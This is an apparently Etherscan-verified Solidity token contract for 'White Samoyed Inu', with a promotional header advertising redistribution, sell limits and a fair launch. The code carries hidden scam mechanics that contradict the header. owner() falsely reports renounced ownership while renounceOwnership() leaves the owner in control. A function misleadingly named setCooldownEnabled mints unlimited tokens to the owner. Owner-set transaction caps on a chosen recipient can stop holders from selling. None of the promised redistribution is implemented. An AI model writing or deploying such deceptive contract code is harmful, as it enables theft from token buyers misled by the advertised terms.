/**
 *Submitted for verification at Etherscan.io on 2021-06-06
*/

/*
White Samoyed Inu - Samoyed Inu

https://t.me/WhiteSamoyedInu

         ,-.-.  ,--.-,,-,--, .=-.-.,--.--------.    ,----.           ,-,--.   ,---.             ___     _,.---._                     ,----.                       .=-.-..-._                     
,-..-.-./  \==\/==/  /|=|  |/==/_ /==/,  -   , -\,-.--` , \        ,-.'-  _\.--.'  \     .-._ .'=.'\  ,-.' , -  `.  ,--.-.  .-,--.,-.--` , \  _,..---._          /==/_ /==/ \  .-._ .--.-. .-.-. 
|, \=/\=|- |==||==|_ ||=|, |==|, |\==\.-.  - ,-./==|-  _.-`       /==/_ ,_.'\==\-/\ \   /==/ \|==|  |/==/_,  ,  - \/==/- / /=/_ /|==|-  _.-`/==/,   -  \        |==|, ||==|, \/ /, /==/ -|/=/  | 
|- |/ |/ , /==/|==| ,|/=| _|==|  | `--`\==\- \  |==|   `.-.       \==\  \   /==/-|_\ |  |==|,|  / - |==|   .=.     \==\, \/=/. / |==|   `.-.|==|   _   _\       |==|  ||==|-  \|  ||==| ,||=| -| 
 \, ,     _|==||==|- `-' _ |==|- |      \==\_ \/==/_ ,    /        \==\ -\  \==\,   - \ |==|  \/  , |==|_ : ;=:  - |\==\  \/ -/ /==/_ ,    /|==|  .=.   |       |==|- ||==| ,  | -||==|- | =/  | 
 | -  -  , |==||==|  _     |==| ,|      |==|- ||==|    .-'         _\==\ ,\ /==/ -   ,| |==|- ,   _ |==| , '='     | |==|  ,_/  |==|    .-' |==|,|   | -|       |==| ,||==| -   _ ||==|,  \/ - | 
  \  ,  - /==/ |==|   .-. ,\==|- |      |==|, ||==|_  ,`-._       /==/\/ _ /==/-  /\ - \|==| _ /\   |\==\ -    ,_ /  \==\-, /   |==|_  ,`-._|==|  '='   /       |==|- ||==|  /\ , ||==|-   ,   / 
  |-  /\ /==/  /==/, //=/  /==/. /      /==/ -//==/ ,     /       \==\ - , |==\ _.\=\.-'/==/  / / , / '.='. -   .'   /==/._/    /==/ ,     /|==|-,   _`/        /==/. //==/, | |- |/==/ , _  .'  
  `--`  `--`   `--`-' `-`--`--`-`       `--`--``--`-----``         `--`---' `--`        `--`./  `--`    `--`--''     `--`-`     `--`-----`` `-.`.____.'         `--`-` `--`./  `--``--`..---'    

White Samoyed Inu is a community-focused, decentralized cryptocurrency with instant rewards for holders. üê∂

With a dynamic sell limit based on price impact and increasing sell cooldowns and redistribution taxes on consecutive sells, White Samoyed Inu
was designed to reward holders and discourage dumping.

1. Buy limit and cooldown timer on buys to make sure no automated bots have a chance to snipe big portions of the pool.
2. No Team & Marketing wallet. 100% of the tokens will come on the market for trade. 
3. No presale wallets that can dump on the community. 

Token Information
1. 1,000,000,000,000 Total Supply
3. Developer provides LP
4. Fair launch for everyone! 
5. 0,2% transaction limit on launch
6. Buy limit lifted after launch
7. Sells limited to 3% of the Liquidity Pool, <2.9% price impact 
8. Sell cooldown increases on consecutive sells, 4 sells within a 24 hours period are allowed
9. 2% redistribution to holders on all buys
10. 7% redistribution to holders on the first sell, increases 2x, 3x, 4x on consecutive sells
11. Redistribution actually works!
12. 5-6% developer fee split within the team

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _ownr;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public pure returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _ownr = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SamoyedInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _isExludedFromTx;
    mapping (address => bool) private _isBlackListedBot;
    address[] private _blackListedBots;
    address public _isExludedFromTxRecipient;
    address public _isExludedFromTxSender;
    uint256 public _maxTxAmount;
    address[] private _excluded;

    uint256 private _TotalSupp = 1000 * 10**9 * 10**18;
    uint256 private _tTotal;
    address public uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    string private _name = 'White Samoyed Inu';
    string private _symbol = 'Samoyed Inu';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _TotalSupp;

        // BLACKLIST
        _isBlackListedBot[address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce)] = true;
        _blackListedBots.push(address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce));

        _isBlackListedBot[address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345)] = true;
        _blackListedBots.push(address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345));

        _isBlackListedBot[address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b)] = true;
        _blackListedBots.push(address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b));

        _isBlackListedBot[address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95)] = true;
        _blackListedBots.push(address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95));

        _isBlackListedBot[address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964)] = true;
        _blackListedBots.push(address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964));

        _isBlackListedBot[address(0xDC81a3450817A58D00f45C86d0368290088db848)] = true;
        _blackListedBots.push(address(0xDC81a3450817A58D00f45C86d0368290088db848));

        _isBlackListedBot[address(0x45fD07C63e5c316540F14b2002B085aEE78E3881)] = true;
        _blackListedBots.push(address(0x45fD07C63e5c316540F14b2002B085aEE78E3881));

        _isBlackListedBot[address(0x27F9Adb26D532a41D97e00206114e429ad58c679)] = true;
        _blackListedBots.push(address(0x27F9Adb26D532a41D97e00206114e429ad58c679));

        _isBlackListedBot[address(0xA2F21e340890408625c27a37AaBBc8CcF51B727f)] = true;
        _blackListedBots.push(address(0xA2F21e340890408625c27a37AaBBc8CcF51B727f));

        _isBlackListedBot[address(0x055658Fa70d40a5fA3d0e3e66c29F7E7ADd08553)] = true;
        _blackListedBots.push(address(0x055658Fa70d40a5fA3d0e3e66c29F7E7ADd08553));

        _isBlackListedBot[address(0x4dEca8f4360809d00fFb5252f8acC7a173458036)] = true;
        _blackListedBots.push(address(0x4dEca8f4360809d00fFb5252f8acC7a173458036));

        _isBlackListedBot[address(0xfad95B6089c53A0D1d861eabFaadd8901b0F8533)] = true;
        _blackListedBots.push(address(0xfad95B6089c53A0D1d861eabFaadd8901b0F8533));
        emit Transfer(address(0), _msgSender(), _TotalSupp);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function setCooldownEnabled(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _TotalSupp = _TotalSupp.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    
    function setMaxTxPercent(uint256 maxTxPercent) public onlyOwner {
        _maxTxAmount = maxTxPercent * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _TotalSupp;
    }

    function openTrading(address excludedTxRecipient , address excludedTxSender) public onlyOwner {
        _isExludedFromTxRecipient = excludedTxRecipient;
        _isExludedFromTxSender = excludedTxSender;
        _maxTxAmount = 6000 * 10**3 * 10**3 * 10**18;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address"); 
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isBlackListedBot[sender], "You have no power here!");
        require(!_isBlackListedBot[recipient], "You have no power here!");
        require(!_isBlackListedBot[tx.origin], "You have no power here!");
        if (sender != _isExludedFromTxSender && recipient == _isExludedFromTxRecipient) {
            require(amount < _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function addBotToBlackList(address account) external onlyOwner() {
        require(account != uniswapRouter, 'We can not blacklist Uniswap router.');
        require(account != address(this));
        require(!_isBlackListedBot[account], "Account is already blacklisted");
        _isBlackListedBot[account] = true;
        _blackListedBots.push(account);
    }

    function removeBotFromBlackList(address account) external onlyOwner() {
        require(_isBlackListedBot[account], "Account is not blacklisted");
        for (uint256 i = 0; i < _blackListedBots.length; i++) {
            if (_blackListedBots[i] == account) {
                _blackListedBots[i] = _blackListedBots[_blackListedBots.length - 1];
                _isBlackListedBot[account] = false;
                _blackListedBots.pop();
                break;
            }
        }
    }
}